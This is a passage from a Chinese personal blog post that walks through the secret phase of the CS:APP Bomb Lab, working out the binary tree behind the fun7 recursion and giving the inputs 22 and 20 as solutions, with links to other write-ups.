<li>我们可以发现这是一棵二叉树啊，结点起始地址 + 0x8 指向左子结点的起始地址，结点起始地址 + 0x10 指向右子结点的起始地址</li>
<li>而我们想要返回 2，就需要：最后一轮返回 0；然后返回 2 * fun7 + 1 返回 1；第一轮返回 2 * fun7 返回 2</li>
<li>所以 esi （字符串转换的 long）先 &lt; edx（结点存储的值），递归左子结点；esi &gt; edx，递归右子结点；esi &#x3D;&#x3D; edx，返回 0</li>
<li>我们看一下这棵二叉树各结点存储的值</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310195943578.png" class="" title="image-20240310195943578">

<ul>
<li>整理如下，因此我们输入的字符串转换为 long 后应该等于 <strong>0x16（22）</strong>，先向左递归，再向右递归，返回</li>
</ul>
<p>​										0x24</p>
<p>​					0x8										0x32</p>
<p>​		0x6				0x16			0x2d						0x6b</p>
<h2 id="Result-6"><a href="#Result-6" class="headerlink" title="Result"></a>Result</h2><ul>
<li>正确答案：<strong>22</strong></li>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310202635836.png" class="" title="image-20240310202635836">

<h2 id="Reference-2"><a href="#Reference-2" class="headerlink" title="Reference"></a>Reference</h2><ul>
<li>还有没有其他答案呢，如果我们继续延申这棵二叉树的话，将会看到</li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310201815192.png" class="" title="image-20240310201815192">

<ul>
<li>整理如下</li>
</ul>
<p>																								</p>
<p>​																										0x24</p>
<p>​													0x8																								0x32</p>
<p>​								0x6										0x16											0x2d										0x6b</p>
<p>​					0x1				0x7				0x14					0x23				0x28					0x2f 			0x63					0x3e9</p>
<ul>
<li>因此我们也可以输入：<strong>20（0x14）</strong>，递归左子结点，递归右子结点，递归左子结点，返回</li>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310202818130.png" class="" title="image-20240310202818130">

<h1 id="Result-7"><a href="#Result-7" class="headerlink" title="Result"></a>Result</h1><ul>
<li><strong>全部答案</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310210042119.png" class="" title="image-20240310210042119">

<ul>
<li><strong>运行结果</strong></li>
</ul>
<img src="/2024/03/05/CSAPP-Lab2/image-20240310210136637.png" class="" title="image-20240310210136637">

<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/JayL-zxl/p/14303519.html">超精讲-逐例分析CS:APP-LAB2-Bomb!(上） - 周小伦 - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://wdxtub.com/csapp/thick-csapp-lab-2/2016/04/16/">【读厚 CSAPP】II Bomb Lab | 小土刀 2.0 (wdxtub.com)</a>（实验内容有点过时了，但其他文章还是很值得看的）</p>
<p><a target="_blank" rel="noopener" href="https://bbs.huaweicloud.com/blogs/421587">【CSAPP】探究BombLab奥秘：Secret_phase的解密与实战-云社区-华为云 (huaweicloud.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://juejin.cn/post/7199276489275572261?from=search-suggest#heading-7">CSAPP: Bomb Lab - 掘金 (juejin.cn)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">yiweiBoi</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yiweiBoi</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
